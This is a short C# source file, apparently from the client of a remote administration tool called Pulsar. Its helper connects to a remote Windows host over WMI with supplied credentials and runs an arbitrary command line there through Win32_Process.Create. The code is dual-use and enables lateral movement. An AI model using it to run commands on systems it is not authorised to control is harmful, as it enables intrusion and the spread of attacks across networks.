using Pulsar.Common.Messages.Network;
using System.Management;
using System.Diagnostics;
using System.Net;

namespace Pulsar.Client.Helper.Network
{
    public static class CommandHelper
    {
        public static int Execute(string command, string username, string password, IPAddress address)
        {
            ConnectionOptions options = new ConnectionOptions
            {
                Username = username,
                Password = password
            };

            ManagementScope scope = new ManagementScope($"\\\\{address}\\root\\cimv2", options);
            scope.Connect();

            ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
            inParams["CommandLine"] = command;

            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
            uint returnValue = (uint)outParams["returnValue"];

            return (int)returnValue;
        }
    }
}
